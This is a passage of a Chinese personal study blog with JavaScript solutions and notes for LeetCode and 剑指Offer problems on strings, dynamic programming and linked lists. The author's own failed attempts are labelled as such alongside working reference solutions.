redo)</h2><p><a href="https://leetcode-cn.com/problems/valid-palindrome-ii/">跳转地址</a></p><p>好难啊。</p><h3 id="思路-amp-题解-19"><a href="#思路-amp-题解-19" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> validPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">s, flag = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = s.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[left] === s[right]) &#123;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> validPalindrome(s.slice(left, right), <span class="literal">true</span>) || validPalindrome(s.slice(left + <span class="number">1</span>, right + <span class="number">1</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-48（LC3）——最长不含重复字符的子字符串（☆☆）（★★-）"><a href="#剑指-Offer-48（LC3）——最长不含重复字符的子字符串（☆☆）（★★-）" class="headerlink" title="剑指 Offer 48（LC3）——最长不含重复字符的子字符串（☆☆）（★★ ）"></a>剑指 Offer 48（LC3）——最长不含重复字符的子字符串（☆☆）（★★ ）</h2><p><a href="https://leetcode-cn.com/problems/zui-chang-bu-han-zhong-fu-zi-fu-de-zi-zi-fu-chuan-lcof/">跳转地址</a></p><p>唯一没做的就遇到了= =（快手一面）</p><h3 id="自己的代码-33"><a href="#自己的代码-33" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>使用set（快手实习一面）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(), max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; s.length; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(map.has(s[j])) &#123;</span><br><span class="line">            i = <span class="built_in">Math</span>.max(map.get(s[j]) + <span class="number">1</span>, i)</span><br><span class="line">        &#125;</span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, j - i + <span class="number">1</span>)</span><br><span class="line">        map.set(s[j], j)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路-amp-题解-20"><a href="#思路-amp-题解-20" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>滑动窗口：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [], max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> index = arr.indexOf(s[i])</span><br><span class="line">        <span class="comment">// 在则删除滑动窗口数组里相同字符及相同字符前的字符，然后将当前字符 push 进数组</span></span><br><span class="line">        <span class="keyword">if</span>(index !== -<span class="number">1</span>) &#123;</span><br><span class="line">            arr.splice(<span class="number">0</span>, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不在则 push 进数组</span></span><br><span class="line">        arr.push(s.charAt(i))</span><br><span class="line">        max = <span class="built_in">Math</span>.max(arr.length, max) </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode1143——最长公共子序列（☆☆）（★）"><a href="#LeetCode1143——最长公共子序列（☆☆）（★）" class="headerlink" title="LeetCode1143——最长公共子序列（☆☆）（★）"></a>LeetCode1143——最长公共子序列（☆☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/longest-common-subsequence/">跳转地址</a></p><p>DP：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonSubsequence = <span class="function"><span class="keyword">function</span>(<span class="params">text1, text2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!text1 || !text2) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> m = text1.length, n = text2.length;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m+<span class="number">1</span>).fill(<span class="number">0</span>).map(<span class="function"><span class="params">e</span>=&gt;</span><span class="keyword">new</span> <span class="built_in">Array</span>(n+<span class="number">1</span>).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (text1[i - <span class="number">1</span>] === text2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">Math</span>.max(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-43——1～n-整数中-1-出现的次数（☆☆☆）（★）（todo）"><a href="#剑指-Offer-43——1～n-整数中-1-出现的次数（☆☆☆）（★）（todo）" class="headerlink" title="剑指 Offer 43——1～n 整数中 1 出现的次数（☆☆☆）（★）（todo）"></a>剑指 Offer 43——1～n 整数中 1 出现的次数（☆☆☆）（★）（todo）</h2><p><a href="https://leetcode-cn.com/problems/1nzheng-shu-zhong-1chu-xian-de-ci-shu-lcof/">跳转地址</a></p><h3 id="自己的代码-34"><a href="#自己的代码-34" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countDigitOne = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> str = i.toString();</span><br><span class="line">        <span class="keyword">while</span> (str.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str.substr(<span class="number">0</span>, <span class="number">1</span>) === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            str = str.substr(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，超时</p><h3 id="思路-amp-题解-21"><a href="#思路-amp-题解-21" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><h2 id="字符串按权重排序"><a href="#字符串按权重排序" class="headerlink" title="字符串按权重排序"></a>字符串按权重排序</h2><p>入参格式：[‘1.20.3’,’6.8.9’,’6.0.0’,’3.1.2’]</p><p>出参格式：[‘6.8.9’,’6.0.0’,’3.1.2’,’1.20.3’]</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    input.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">        a = a.split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        b = b.split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (a[<span class="number">0</span>] !== b[<span class="number">0</span>]) <span class="keyword">return</span> <span class="built_in">parseInt</span>(b[<span class="number">0</span>]) - <span class="built_in">parseInt</span>(a[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] !== b[<span class="number">1</span>]) <span class="keyword">return</span> <span class="built_in">parseInt</span>(b[<span class="number">1</span>]) - <span class="built_in">parseInt</span>(a[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">parseInt</span>(b[<span class="number">2</span>]) - <span class="built_in">parseInt</span>(a[<span class="number">2</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> input; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="LeetCode141——环形链表（☆）"><a href="#LeetCode141——环形链表（☆）" class="headerlink" title="LeetCode141——环形链表（☆）"></a>LeetCode141——环形链表（☆）</h2><h2 id="LeetCode142——环形链表II（☆☆）（★★）"><a href="#LeetCode142——环形链表II（☆☆）（★★）" class="headerlink" title="LeetCode142——环形链表II（☆☆）（★★）"></a>LeetCode142——环形链表II（☆☆）（★★）</h2><p><a href="https://leetcode-cn.com/problems/linked-list-cycle/">跳转地址</a>、<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">2跳转地址</a></p><h3 id="自己的代码-35"><a href="#自己的代码-35" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>正常做法就是创建空数组（或set），然后遍历判断。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">        <span class="keyword">if</span> (set.has(head)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        set.add(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC</p><h3 id="思路1-amp-题解-16"><a href="#思路1-amp-题解-16" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p><strong>污链表法</strong>：在 Javascript 里面定义的任何数据结构，其类型都是 object。这意味着，可以给一个对象设定任何属性。我们为每次遍历的节点设定一个标记，如果存在环，那么一定存在某个节点已经设定过标记。否则链表遍历结束其不为环。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (head) &#123;</span><br><span class="line">    <span class="keyword">if</span> (head.flag) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    head.flag = <span class="literal">true</span>;</span><br><span class="line">    head = head.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-17"><a href="#思路2-amp-题解-17" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p><strong>快慢指针：</strong></p><ul><li>定义“快指针 fastp”、“慢指针 slowp”，<strong>“快指针”总比“慢指针”快一步</strong>。</li><li>进入环形链表，当 fastp === slowp，说明“快指针”追上了“慢指针”。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> slowp = head, fastp = head;</span><br><span class="line">    <span class="keyword">while</span> (fastp.next !== <span class="literal">null</span> &amp;&amp; fastp.next.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        slowp = slowp.next;</span><br><span class="line">        fastp = fastp.next.next;</span><br><span class="line">        <span class="keyword">if</span> (slowp === fastp) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode160——相交链表（☆）"><a href="#LeetCode160——相交链表（☆）" class="headerlink" title="LeetCode160——相交链表（☆）"></a>LeetCode160——相交链表（☆）</h2><p><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">跳转地址</a></p><h3 id="自己的代码-36"><a href="#自己的代码-36" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>没有思路，双指针遍历也不会做。</p><h3 id="思路1-amp-题解-17"><a href="#思路1-amp-题解-17" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p><strong>哈希集合</strong></p><p>首先遍历链表 headA，并将每个节点加入哈希集合（Set）。然后遍历链表 headB，对于遍历到的每个节点，判断该节点是否在哈希集合中：</p><ul><li><p>如果当前节点不在哈希集合中，则继续遍历下一个节点；</p></li><li><p>如果当前节点在哈希集合中，<strong>则后面的节点都在哈希集合中</strong>（应该是不会出现分叉的情况），即从当前节点开始的所有节点都在两个链表的相交部分，因此返回第一个相交节点。</p></li><li><p>如果链表 headB 中的所有节点都不在哈希集合中，则两个链表不相交，返回 null。</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getIntersectionNode = <span class="function"><span class="keyword">function</span> (<span class="params">headA, headB</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> visited = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">while</span> (headA) &#123;</span><br><span class="line">        visited.add(headA);</span><br><span class="line">        headA = headA.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (headB) &#123;</span><br><span class="line">        <span class="keyword">if</span> (visited.has(headB)) &#123;</span><br><span class="line">            <span class="keyword">return</span> headB;</span><br><span class="line">        &#125;</span><br><span class="line">        headB = headB.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(m+n)，其中 m 和 n 是分别是链表 headA 和 headB 的长度。需要遍历两个链表各一次。</p><h3 id="思路2-amp-题解-18"><a href="#思路2-amp-题解-18" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p><strong>双指针</strong>：**”错的人就算走过了对方的路也还是会错过”**</p><p>只有当链表 headA 和 headB 都不为空时，两个链表才可能相交。因此首先判断链表 headA 和 headB 是否为空，如果其中至少有一个链表为空，则两个链表一定不相交，返回 null。</p><p>当链表 headA 和 headB 都不为空时，创建两个头指针 pA 和 pB，依次遍历两个链表的每个节点：</p><ul><li><p>每步操作需要同时更新指针 pA 和 pB。</p></li><li><p>如果指针 pA 不为空，则将指针 pA 移到下一个节点；如果指针 pB 不为空，则将指针 pB 移到下一个节点。</p></li><li><p>如果指针 pA 为空，则将指针 pA 移到链表 headB 的头节点；如果指针 pB 为空，则将指针 pB 移到链表 headA 的头节点。</p></li><li><p>当指针 pA 和 pB 指向同一个节点或者都为空时，返回它们指向的节点或者 null。</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getIntersectionNode = <span class="function"><span class="keyword">function</span>(<span class="params">headA, headB</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (headA === <span class="literal">null</span> || headB === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> pA = headA, pB = headB;</span><br><span class="line">    <span class="keyword">while</span> (pA !== pB) &#123;</span><br><span class="line">        pA = pA === <span class="literal">null</span> ? headB : pA.next;</span><br><span class="line">        pB = pB === <span class="literal">null</span> ? headA : pB.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pA;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(m+n)，其中 m 和 n 是分别是链表 headA 和 headB 的长度。两个指针同时遍历两个链表，每个指针遍历两个链表各一次。</p><h2 id="LeetCode206——反转链表（☆）（★★★★）"><a href="#LeetCode206——反转链表（☆）（★★★★）" class="headerlink" title="LeetCode206——反转链表（☆）（★★★★）"></a>LeetCode206——反转链表（☆）（★★★★）</h2><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/">跳转地址</a></p><h3 id="自己的代码-37"><a href="#自己的代码-37" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">while</span> (head !== <span class="literal">null</span>) &#123;</span><br><span class="line">        arr.unshift(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">        arr[i].next=arr[i+<span class="number">1</span>].val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC。瞎写，没想到这是双向链表题。</p><h3 id="思路-amp-题解-22"><a href="#思路-amp-题解-22" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>迭代：<a href="https://leetcode.com/problems/reverse-linked-list/discuss/1449712/Easy-C%2B%2BJavaPythonJavaScript-Explained%2BAnimated">=&gt;动画</a></p><ul><li>定义“前指针prev”、“当前指针curr”、“后指针next”</li><li>对原始链表每个节点：<ul><li>首先将 next 初始化为 curr 之后的节点。即（n=cur-&gt;next）。</li><li>然后让 curr-&gt;next 指向 prev（下一个节点指针）。</li><li>然后让 prev 现在指向（前面一个节点）cur 节点。</li><li>最后将 cur 也向前移动一个节点到 next。</li></ul></li><li><strong>最后返回 prev，即可获得整条反向链表</strong></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prev = <span class="literal">null</span>, curr = head, next = head;</span><br><span class="line">    <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">        next = curr.next;</span><br><span class="line">        curr.next = prev;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解构赋值</span></span><br><span class="line"><span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    [curr.next, prev, curr] = [prev, curr, curr.next];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-19"><a href="#思路2-amp-题解-19" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> reverseList = <span class="function">(<span class="params">cur, prev = <span class="literal">null</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!cur) <span class="keyword">return</span> prev;</span><br><span class="line">  <span class="keyword">const</span> next = cur.next;</span><br><span class="line">  cur.next = prev;</span><br><span class="line">  <span class="keyword">return</span> reverseList(next, cur);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode21——合并两个有序链表（☆）（高频）"><a href="#LeetCode21——合并两个有序链表（☆）（高频）" class="headerlink" title="LeetCode21——合并两个有序链表（☆）（高频）"></a>LeetCode21——合并两个有序链表（☆）（高频）</h2><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">跳转地址</a></p><h3 id="自己的代码-38"><a href="#自己的代码-38" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>不会。。有太多种情况，难道都用 if 判断吗？（不开辟新的空间前提下）</p><h3 id="思路1-amp-题解-18"><a href="#思路1-amp-题解-18" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><ul><li>返回值：每一层调用都返回排序好的链表头</li><li>终止条件：l1 为空或 l2 为空时结束</li><li>单层递归内容：如果 l1 的 val 值更小，则将 l1.next 与排序好的链表头相接，l2 同理</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTwoLists = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l1 === <span class="literal">null</span>) <span class="keyword">return</span> l2;</span><br><span class="line">  <span class="keyword">if</span> (l2 === <span class="literal">null</span>) <span class="keyword">return</span> l1;</span><br><span class="line">  <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">    l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">    <span class="keyword">return</span> l2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-20"><a href="#思路2-amp-题解-20" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>开辟新空间：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTwoLists = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mergedHead = &#123; <span class="attr">val</span> : -<span class="number">1</span>, <span class="attr">next</span> : <span class="literal">null</span> &#125;,</span><br><span class="line">        crt = mergedHead;</span><br><span class="line">    <span class="keyword">while</span>(l1 &amp;&amp; l2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(l1.val &gt; l2.val) &#123;</span><br><span class="line">            crt.next = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            crt.next = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        crt = crt.next;</span><br><span class="line">    &#125;</span><br><span class="line">    crt.next = l1 || l2;</span><br><span class="line">    <span class="keyword">return</span> mergedHead.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode24——两两交换链表中的节点（☆☆）"><a href="#LeetCode24——两两交换链表中的节点（☆☆）" class="headerlink" title="LeetCode24——两两交换链表中的节点（☆☆）"></a>LeetCode24——两两交换链表中的节点（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">跳转地址</a></p><h3 id="自己的代码-39"><a href="#自己的代码-39" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> curr = head, res = curr.next;</span><br><span class="line">  <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    <span class="keyword">let</span> next = curr.next;</span><br><span class="line">    curr.next = next.next;</span><br><span class="line">    next.next = curr;</span><br><span class="line">    curr = next.next.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没过。逻辑上应该没问题啊。</p><h3 id="思路1-amp-题解-19"><a href="#思路1-amp-题解-19" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>迭代：</p><ul><li>设置虚拟头结点 dummy，因为真实头结点要换人，设置了 dummy 后，dummy.next 就能找到头结点。<strong>（想不到）</strong></li><li>开启 while 循环，一对结点的交换有三个指针要改变。<img src="https://i.loli.net/2021/08/12/IUrsqcJ4azfjdCW.png" alt="image.png"></li><li>指针推进，准备交换下一对结点。</li><li>最后返回 dummy.next 。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">  dummy.next = head;</span><br><span class="line">  <span class="keyword">let</span> prev = dummy;</span><br><span class="line">  <span class="keyword">while</span> (head &amp;&amp; head.next) &#123;</span><br><span class="line">    <span class="keyword">let</span> next = head.next;</span><br><span class="line">    <span class="comment">// 三步完成一对交换</span></span><br><span class="line">    head.next = next.next;</span><br><span class="line">    next.next = head;</span><br><span class="line">    prev.next = next;</span><br><span class="line"><span class="comment">// 指针更新</span></span><br><span class="line">    prev = head;</span><br><span class="line">    head = head.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-21"><a href="#思路2-amp-题解-21" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>递归：</p><ul><li>交换当前两个节点</li><li>递归并连接两组节点。将第三个节点作为递归的参数，<strong>上一组尾部连接下一组头部</strong>(递归返回的值)。</li><li>终结条件。当节点为 null 或节点的下一个节点为 null 时，无法交换，递归结束。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head.next) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">var</span> v1 = head, v2 = head.next, v3 = v2.next;</span><br><span class="line">    v2.next = v1;</span><br><span class="line">    v1.next = swapPairs(v3);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode25——K-个一组翻转链表（☆☆☆）（to-redo）"><a href="#LeetCode25——K-个一组翻转链表（☆☆☆）（to-redo）" class="headerlink" title="LeetCode25——K 个一组翻转链表（☆☆☆）（to redo）"></a>LeetCode25——K 个一组翻转链表（☆☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/">跳转地址</a></p><h3 id="自己的代码-40"><a href="#自己的代码-40" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>不会。思路是在翻转链表的基础上传 k ，但是不知道如何在主函数中调用。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseList = <span class="function"><span class="keyword">function</span>(<span class="params">head, count</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> prev = <span class="literal">null</span>, curr = head, next = head;</span><br><span class="line">  <span class="keyword">while</span> (count &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    next = curr.next;</span><br><span class="line">    curr.next = prev;</span><br><span class="line">    prev = curr;</span><br><span class="line">    curr = next;</span><br><span class="line">    count--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路-amp-题解-23"><a href="#思路-amp-题解-23" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>不需要在反转链表中传 k 值。在 reverseKGroup 函数中通过循环找到首尾节点（head、tail 的间隔就是 k 值），再通过递归，上一组的尾节点链接下一组的头结点。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseKGroup</span>(<span class="params">head, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!head) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> tail = head;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;</span><br><span class="line">    tail = tail.next;</span><br><span class="line">    <span class="keyword">if</span> (!tail) <span class="keyword">return</span> head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> next = tail.next;</span><br><span class="line">  tail.next = <span class="literal">null</span>;</span><br><span class="line">  reverse(head);</span><br><span class="line">  <span class="comment">// 此时 head 为上一组尾节点，next 为下一组头结点</span></span><br><span class="line">  head.next = reverseKGroup(next, k);</span><br><span class="line">  <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 